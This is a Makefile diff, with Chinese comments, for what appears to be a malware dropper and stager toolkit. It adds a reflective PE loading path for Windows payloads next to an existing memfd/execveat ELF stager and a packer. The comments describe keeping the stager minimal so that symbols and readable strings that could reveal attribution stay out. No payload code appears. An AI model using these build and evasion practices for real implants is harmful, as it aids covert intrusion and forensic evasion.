@@ -44,6 +44,23 @@ PACKOBJ_MIN := $(filter ../20_packer/build/shaped.o \
                         ../20_packer/build/crypto_hash.o \
                         ../20_packer/build/crypto_gcm.o, $(PACKOBJ))
 
+# ---- PE 载荷路径 ----
+#
+# Windows 目标上制品的明文载荷是 PE32+，落地靠反射装载而不是 memfd/execveat。
+# 因此这一条路径复用：
+#   17_loader/src/pe.c        头解析、节区映射、基址重定位、IAT 绑定
+#   17_loader/src/reflect.c   内存映像构造
+#   agent_windows/src/reflect_run.c  节区权限 / TLS / 入口三步
+# 不重复实现任何一层。三者都是平台无关纯 C，故可在 Linux 下真编译真跑。
+#
+# 注意：不要把 PESRCS 并入 SRCS/STAGOBJ —— stager 的最小闭包是上一轮实测
+# 求得的归因修复成果，PE 反射链会带进大量符号名与可读串，Windows stager
+# 需要它，但 Linux stager 不需要，一律不带。
+PEFLAGS := -I../agent_windows/include -I../17_loader/include
+PESRCS  := src/drop_pe.c
+PEDEPS  := $(BUILD)/dep/aw_reflect_run.o $(BUILD)/dep/ld_pe.o \
+           $(BUILD)/dep/ld_reflect.o
+
 SRCS    := src/drop.c src/drop_http.c src/pic_exec.c
 # stager 不链接 pic_exec.c：它走 dp_asm_exec（ELF + memfd）路径，
 # PIC 路径是另一条投递形态，不需要的代码一律不带 —— 每一个多余目标文件
@@ -56,7 +73,8 @@ PACKSRC := src/deploy_pack.c
 .PHONY: all test clean attrib
 
 all: $(BUILD)/deploy_pack $(BUILD)/drop_serve $(BUILD)/drop_stager \
-     $(BUILD)/test_drop $(BUILD)/test_deploy $(BUILD)/test_pic
+     $(BUILD)/test_drop $(BUILD)/test_deploy $(BUILD)/test_pic \
+     $(BUILD)/test_drop_pe
 
 $(BUILD):
 	mkdir -p $(BUILD)
@@ -82,6 +100,22 @@ $(BUILD)/test_deploy: tests/test_deploy.c $(PACKOBJ) | $(BUILD)
 $(BUILD)/test_pic: tests/test_pic.c $(SRCS) $(PACKOBJ) | $(BUILD)
 	$(CC) $(CFLAGS) $< $(SRCS) $(PACKOBJ) -o $@
 
+# PE 路径：额外带 PEFLAGS（agent_windows / 17_loader 头文件）
+$(BUILD)/dep/aw_reflect_run.o: ../agent_windows/src/reflect_run.c | $(BUILD)
+	@mkdir -p $(BUILD)/dep
+	$(CC) $(CFLAGS) $(PEFLAGS) -c $< -o $@
+
+$(BUILD)/dep/ld_pe.o: ../17_loader/src/pe.c | $(BUILD)
+	@mkdir -p $(BUILD)/dep
+	$(CC) $(CFLAGS) $(PEFLAGS) -c $< -o $@
+
+$(BUILD)/dep/ld_reflect.o: ../17_loader/src/reflect.c | $(BUILD)
+	@mkdir -p $(BUILD)/dep
+	$(CC) $(CFLAGS) $(PEFLAGS) -c $< -o $@
+
+$(BUILD)/test_drop_pe: tests/test_drop_pe.c $(SRCS) $(PESRCS) $(PACKOBJ) $(PEDEPS) | $(BUILD)
+	$(CC) $(CFLAGS) $(PEFLAGS) $< $(SRCS) $(PESRCS) $(PACKOBJ) $(PEDEPS) -o $@
+
 # 归因特征自查。
 #
 # 只断言"stager 里没有"是不够的 —— 若扫描本身写错（大小写、转义、扫了源码
@@ -96,6 +130,7 @@ test: $(BUILD)/test_drop $(BUILD)/test_deploy $(BUILD)/test_pic
 	./$(BUILD)/test_drop
 	./$(BUILD)/test_deploy
 	./$(BUILD)/test_pic
+	./$(BUILD)/test_drop_pe
 
 clean:
 	rm -rf $(BUILD)
